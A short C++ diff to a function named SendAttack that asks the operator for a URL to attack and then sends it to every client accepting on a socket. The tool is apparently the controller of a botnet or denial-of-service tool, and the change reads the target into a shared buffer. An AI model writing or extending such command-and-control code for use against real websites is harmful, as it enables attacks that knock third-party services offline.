@@ -97,9 +97,8 @@ int Menu() {
 }
 
 void SendAttack() {
-	char url[] = "";
 	cout << endl << GREEN "Enter the URL you want to attack (with http[s]): " RED;
-	cin.getline(url, sizeof(url));
+	cin.getline(buffer, sizeof(buffer));
 	while (true) {
 		SOCKET client = accept(sock, NULL, NULL);
 		send(client, buffer, sizeof(buffer), 0);
